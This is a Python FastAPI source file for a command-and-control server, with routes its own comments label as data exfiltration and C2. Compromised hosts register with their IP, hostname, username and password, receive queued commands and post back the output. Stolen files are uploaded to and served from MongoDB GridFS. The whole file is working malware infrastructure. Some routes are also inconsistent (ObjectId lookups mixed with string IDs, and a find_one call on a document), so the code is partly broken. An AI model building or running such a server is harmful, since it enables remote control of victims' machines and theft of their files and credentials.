from bson import ObjectId
from fastapi import FastAPI, File, HTTPException, UploadFile, Request
from fastapi.responses import HTMLResponse, StreamingResponse
from gridfs import GridFS
from pymongo import MongoClient
from pydantic import BaseModel
from fastapi.templating import Jinja2Templates
import os

app = FastAPI()

templates = Jinja2Templates(directory="templates")  # Create a templates directory

# Initialize the MongoDB client
client = MongoClient("mongodb://mongo:27017/")
db = client["mydatabase"]
connections = db["connections"]
fs = GridFS(db)

class FileResponse(BaseModel):
    filename: str

# index route
@app.get('/')
async def index(request: Request):
    return templates.TemplateResponse('index.html', {'request': request})

# Data exfiltration routes

# render the upload form in an HTML template
@app.post('/upload')
async def upload_file(file: UploadFile = File(...)):
    if not file:
        return {'error': 'No file part'}

    if file.filename == '':
        return {'error': 'No selected file'}

    # Save the file to MongoDB GridFS
    with fs.new_file(filename=file.filename) as grid_file:
        grid_file.write(file.file.read())

    return {'message': 'File uploaded successfully', 'filename': file.filename}

# render the upload form in an HTML template
@app.get('/list-files')
async def list_files():
    file_list = []  # This will store a list of files and directories

    # Query MongoDB's GridFS for a list of files
    for grid_file in fs.find():
        file_list.append(grid_file.filename)

    return file_list

# render the file list in an HTML template
@app.get('/list-files-view')
async def list_files_view(request: Request):
    file_list = await list_files()
    return templates.TemplateResponse('list_files.html', {'request': request, 'file_list': file_list})

# render the file content in an HTML template
@app.get('/file/{filename}')
async def file_content(request: Request, filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Check if the file has a supported file extension
    supported_extensions = ['.txt', '.pdf', '.conf', '.json']
    file_extension = os.path.splitext(filename)[1]
    if file_extension not in supported_extensions:
        return templates.TemplateResponse('unsupported_file.html', {'request': request, 'filename': filename})

    content = grid_file.read()

    # Render the content in an HTML template
    return templates.TemplateResponse('file_content.html', {'request': request, 'filename': filename, 'content': content.decode()})

# download the file
@app.get('/download/{filename}')
async def download_file(filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Return the file data as a response
    return StreamingResponse(grid_file, media_type='application/octet-stream')

# C2 routes

# add a new command to the database
@app.post('/command/{connection_id}')
async def add_command(connection_id: str, command: str):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": connection_id})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    # add the command to the database
    connections.update_one({"_id": connection_id}, {"$push": {"commands": command}})

    return {"message": "Command added to queue"}

# return the new commands for the client from the database based on the connection ID
@app.get('/commands/{connection_id}')
async def get_commands(connection_id: str):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    # retrieve the commands from the database
    commands = connections.find_one({"_id": ObjectId(connection_id)})["commands"]

    # clear the commands from the database
    connections.update_one({"_id": ObjectId(connection_id)}, {"$set": {"commands": []}})

    return commands

# get a list of all commands for one connection from the database to be displayed in the web interface
@app.get('/command-list/{connection_id}')
async def get_command_list(connection_id):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    # retrieve the commands from the database
    commands = connections.find_one({"_id": ObjectId(connection_id)})["commands"]

    return commands

# render a list of all connections in an HTML template
@app.get('/command-center')
async def command_center(request: Request):
    # Retrieve all connections from the database
    connection_list = []
    for connection in connections.find():
        # get the _id: ObjectId of the connection and convert it to a string
        # connection["_id"] = str(connection["_id"])
        # append the connection to the list
        connection_list.append(connection)

    return templates.TemplateResponse('command_center.html', {'request': request, 'connection_list': connection_list})

# "terminal" or command center route
@app.get("/command-center/terminal/{connection_id}")
async def terminal(request: Request, connection_id):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    # retrieve the commands from the database
    commands = connection.find_one({"_id": ObjectId(connection_id)})["commands"]
    print(commands)

    # retrieve the output from the database
    output = connection['output']

    return templates.TemplateResponse("terminal.html", {"request": request, "connection_id": connection_id, "commands": commands, "output": output, "connection": connection})

# register a new connection
@app.post('/register')
async def register_connection(os_type: str, ip_address: str, hostname: str, username: str, password: str):
    # set username and password to None if they are empty
    if username == "": username = None
    if password == "": password = None
    # store the connection in the database
    connection_id = connections.insert_one({"os_type": os_type, "ip_address": ip_address, "hostname": hostname, "username": username, "password": password, "commands": [], "output": ""}).inserted_id
    print("Connection registered: " + str(connection_id))
    return {"id": str(connection_id)}
    
# unregister a connection
@app.delete('/unregister/{connection_id}')
async def unregister_connection(connection_id: str):
    # delete the connection from the database
    connections.delete_one({"_id": connection_id})
    return {"message": "Connection unregistered"}

# get the details of a connection
@app.get('/connection/{connection_id}/details')
async def get_connection_details(connection_id: str):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": connection_id})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    return connection

# add the output of the command to the database
@app.post('/output/{connection_id}')
async def add_output(connection_id: str, output: str):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": connection_id})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    # add the output to the database
    connections.update_one({"_id": connection_id}, {"$set": {"output": output}})

    return {"message": "Output added to queue"}

# get the output of the command from the database
@app.get('/output/{connection_id}')
async def get_output(connection_id: str):
    # retrieve the connection from the database
    connection = connections.find_one({"_id": connection_id})
    if not connection:
        raise HTTPException(status_code=404, detail="Connection not found")

    # retrieve the output from the database
    output = connection["output"]

    # clear the output from the database
    connections.update_one({"_id": connection_id}, {"$set": {"output": ""}})

    return {"output": output}




